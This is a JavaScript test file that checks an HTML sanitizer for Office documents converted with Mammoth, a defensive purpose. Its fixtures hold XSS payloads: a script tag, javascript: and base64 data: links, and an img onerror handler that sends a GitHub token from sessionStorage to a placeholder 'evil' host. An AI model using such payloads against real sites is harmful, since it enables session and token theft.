import { test } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import { sanitizeOfficeHtml } from '../js/binary-viewer.js';

function makePurifier() {
  const { window } = new JSDOM('');
  return createDOMPurify(window);
}

test('sanitizeOfficeHtml: fail-closed when purifier is missing', () => {
  assert.throws(() => sanitizeOfficeHtml('<p>x</p>', null), /sanitizer/i);
  assert.throws(() => sanitizeOfficeHtml('<p>x</p>', undefined), /sanitizer/i);
});

test('sanitizeOfficeHtml: strips script and onerror from Mammoth-like HTML', () => {
  const purify = makePurifier();
  // Typical hostile fragment that could come from a crafted DOCX via Mammoth
  const dirty =
    '<p>Hello</p>' +
    '<script>document.sessionStorage.clear()</script>' +
    '<img src=x onerror="fetch(`https://evil/?t=`+sessionStorage.gh_token)">' +
    '<a href="javascript:alert(1)">js link</a>' +
    '<a href="https://example.com">safe</a>';

  const { window } = new JSDOM('');
  const clean = sanitizeOfficeHtml(dirty, purify, window.document);

  assert.doesNotMatch(clean, /<script/i);
  assert.doesNotMatch(clean, /onerror/i);
  assert.doesNotMatch(clean, /javascript:/i);
  assert.match(clean, /Hello/);
  // safe http(s) links kept, forced to new tab + noopener
  assert.match(clean, /https:\/\/example\.com/);
  assert.match(clean, /rel="noopener noreferrer"/);
  assert.match(clean, /target="_blank"/);
});

test('sanitizeOfficeHtml: javascript: and data: text links lose href', () => {
  const purify = makePurifier();
  const { window } = new JSDOM('');
  const dirty =
    '<a href="javascript:alert(1)">a</a>' +
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">b</a>' +
    '<a href="https://ok.example/path">c</a>';
  const clean = sanitizeOfficeHtml(dirty, purify, window.document);

  // Hostile schemes must not remain as navigable href
  assert.doesNotMatch(clean, /href\s*=\s*["']javascript:/i);
  // https kept
  assert.match(clean, /href="https:\/\/ok\.example\/path"/);
});

test('sanitizeOfficeHtml: empty / null input does not throw after purifier check', () => {
  const purify = makePurifier();
  const { window } = new JSDOM('');
  assert.equal(sanitizeOfficeHtml('', purify, window.document), '');
  // null becomes string via sanitizeHtml path
  const out = sanitizeOfficeHtml(null, purify, window.document);
  assert.equal(typeof out, 'string');
});
